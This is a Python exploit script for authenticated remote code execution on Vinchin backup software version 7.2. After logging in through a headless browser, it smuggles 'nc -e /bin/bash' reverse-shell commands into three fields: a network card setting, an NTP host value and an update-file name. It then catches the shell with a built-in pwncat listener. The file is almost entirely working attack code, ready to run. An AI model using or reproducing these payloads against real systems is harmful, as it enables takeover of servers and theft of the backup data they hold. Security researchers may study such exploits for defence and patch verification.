import sys
import time
import json
import socket
import requests
import argparse
import threading
import pwncat.manager

from selenium import webdriver
from rich.console import Console
from fake_useragent import UserAgent
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support import expected_conditions as EC
from requests.packages.urllib3.exceptions import InsecureRequestWarning


class VinchinRCE:
    def __init__(
        self,
        url: str,
        username: str,
        password: str,
        rshell_ip: str,
        rshell_port: str,
        payload_type: str,
    ):
        self.url = url
        self.username = username
        self.password = password
        self.rshell_ip = rshell_ip
        self.rshell_port = rshell_port
        self.payload_type = payload_type
        self.console = Console()
        self.driver = self.setup_driver()

        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    def setup_driver(self) -> webdriver.Chrome:
        self.custom_print("Initializing WebDriver options...", "*")
        options = Options()
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--headless")
        user_agent = UserAgent().random
        options.add_argument(f"user-agent={user_agent}")
        self.custom_print("Setting up WebDriver service...", "*")
        service = Service(ChromeDriverManager().install())
        self.custom_print("Launching Chrome browser...", "*")
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_window_size(1366, 768)
        return driver

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        self.console.print(
            f"[bold {header_colors[header]}][{header}][/bold {header_colors[header]}] {message}"
        )

    def start_listener(self) -> None:
        with socket.create_server((self.rshell_ip, int(self.rshell_port))) as listener:
            self.custom_print(
                f"Waiting for incoming connection on port {self.rshell_port}...", "*"
            )
            victim, victim_addr = listener.accept()
            self.custom_print(
                f"Received connection from {victim_addr[0]}:{victim_addr[1]}", "+"
            )

            with pwncat.manager.Manager() as manager:
                manager.create_session(
                    platform="linux", protocol="socket", client=victim
                )
                self.custom_print("Dropping to pwncat prompt...", "+")
                manager.interactive()

    def login(self) -> None:
        self.custom_print(f"Accessing the URL: {self.url}...", "*")
        self.driver.get(self.url)

        try:
            self.custom_print("Waiting for the username input field...", "*")
            username_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )

            self.custom_print("Waiting for the password input field...", "*")
            password_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "password"))
            )

            self.custom_print("Waiting for the submit button...", "*")
            submit_button = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.ID, "login-btn"))
            )

            self.custom_print("Sending username and password...", "*")

            username_input.send_keys(self.username)
            password_input.send_keys(self.password)

            self.custom_print("Submitting the form...", "*")

            submit_button.click()
            time.sleep(2)
            page_content = self.driver.page_source

            if "invalid" in page_content.lower():
                self.custom_print(
                    "Login failed. CAPTCHA detected or wrong credentials.", "-"
                )
                sys.exit(1)

            elif "incorrect" in page_content.lower():
                self.custom_print("Login failed, wrong credentials", "-")
                sys.exit(1)

            else:
                self.custom_print("Logged In!", "+")
                self.custom_print(
                    f"Using {self.payload_type} exploitation method !", "+"
                )
                match self.payload_type:
                    case "setNetworkCardInfo":
                        self.setNetworkCardInfo()
                    case "syncNtpTime":
                        self.syncNtpTime()
                    case "deleteUpdateAPK":
                        self.deleteUpdateAPK()

        except Exception as e:
            self.custom_print(f"An error occurred: {e}", "-")

    def setNetworkCardInfo(self) -> None:
        self.custom_print("Navigating to system management...", "*")
        system_link = WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.NAME, "sysmanagement"))
        )
        system_link.click()

        self.custom_print("Navigating to setting manager...", "*")
        setting_manager_link = WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.NAME, "setting_manager"))
        )
        setting_manager_link.click()

        self.custom_print("Navigating to network settings...", "*")
        network_settings_link = WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable(
                (By.XPATH, "//a[contains(@href, 'system_network.php')]")
            )
        )
        network_settings_link.click()

        self.custom_print(
            f"Injecting payload for reverse shell: {self.rshell_ip}:{self.rshell_port}...",
            "*",
        )
        payload = f"; /bin/nc -e /bin/bash {self.rshell_ip} {self.rshell_port}"
        networkcard_option = WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located(
                (By.XPATH, "//select[@name='networkcard']/option")
            )
        )
        self.driver.execute_script(
            "arguments[0].innerText = arguments[1]", networkcard_option, payload
        )

        self.custom_print("Submitting the network settings form...", "*")
        ok_button = WebDriverWait(self.driver, 15).until(
            EC.element_to_be_clickable((By.ID, "ipsubmit"))
        )
        ok_button.click()

        self.custom_print("Check your listener h4x0rm4n...", "+")

    def syncNtpTime(self) -> None:
        cookies = self.driver.get_cookies()

        session = requests.Session()
        cookie_dict = {cookie["name"]: cookie["value"] for cookie in cookies}

        p_param = {
            "ntphost": f"time.nist.gov;nc -e /bin/bash {self.rshell_ip} {self.rshell_port}"
        }
        p_param_json = json.dumps(p_param)

        data = {"m": "8", "f": "syncNtpTime", "p": p_param_json}

        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Origin": self.url,
        }

        response = session.post(
            f"{self.url}/api/",
            headers=headers,
            cookies=cookie_dict,
            data=data,
            verify=False,
        )

        if response.status_code == 200:
            if "msg" in response.text and "unavailable" in response.text:
                self.custom_print(
                    "System service is unavailable. Please choose a different payload_type.",
                    "!",
                )
                sys.exit(1)

    def deleteUpdateAPK(self) -> None:
        cookies = self.driver.get_cookies()

        session = requests.Session()
        cookie_dict = {cookie["name"]: cookie["value"] for cookie in cookies}

        p_param = {
            "md5": "h4x0rm4n",
            "file_name": f";nc -e /bin/bash {self.rshell_ip} {self.rshell_port}",
        }
        p_param_json = json.dumps(p_param)

        data = {"m": "8", "f": "deleteUpdateAPK", "p": p_param_json}

        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Origin": self.url,
        }

        session.post(
            f"{self.url}/api/",
            headers=headers,
            cookies=cookie_dict,
            data=data,
            verify=False,
        )


def main() -> None:
    parser = argparse.ArgumentParser(description="Authenticated RCE on VinChin 7.2.")
    parser.add_argument(
        "-u",
        "--url",
        default="https://192.168.1.4/login.php",
        help="URL of the login page",
    )
    parser.add_argument(
        "-user", "--username", default="admin", help="Username for login"
    )
    parser.add_argument("-p", "--password", default="123456", help="Password for login")
    parser.add_argument(
        "-rip", "--rshell_ip", default="192.168.1.5", help="Reverse shell IP address"
    )
    parser.add_argument(
        "-rport", "--rshell_port", default="1338", help="Reverse shell port"
    )
    parser.add_argument(
        "--payload_type",
        default="syncNtpTime",
        choices=["setNetworkCardInfo", "syncNtpTime", "deleteUpdateAPK"],
        help="Type of payload to send",
    )

    args = parser.parse_args()

    vinchin_rce = VinchinRCE(
        args.url,
        args.username,
        args.password,
        args.rshell_ip,
        args.rshell_port,
        args.payload_type,
    )

    listener_thread = threading.Thread(target=vinchin_rce.start_listener)
    listener_thread.daemon = True
    listener_thread.start()

    vinchin_rce.login()

    listener_thread.join()


if __name__ == "__main__":
    main()
